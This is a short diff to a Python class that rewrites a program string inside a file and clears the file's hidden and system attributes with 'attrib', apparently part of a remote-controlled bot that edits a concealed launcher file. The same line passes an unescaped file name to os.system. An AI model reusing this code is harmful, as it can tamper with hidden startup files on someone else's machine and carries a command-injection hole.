@@ -4,7 +4,7 @@ class Change_Prog():
 	def __init__(self, _):
 		self.program = " ".join(_.args[0])
 		self.Send_Message = _.Send_Message
-		self.program = _.program
+		self.note = _.note
 		self.Main()
 
 	def Main(self):
@@ -13,7 +13,7 @@ class Change_Prog():
 		file = open(filename,"r")
 		read = file.read()
 		file.close()
-		read = read.replace(re.findall('" ""(.*?)""',read)[0],self.program)
+		read = read.replace(re.findall('" ""(.*?)""',read)[0],self.note)
 		os.system('attrib -h -s ' + filename)
 		file = open(filename,"w")
 		file.write(read)
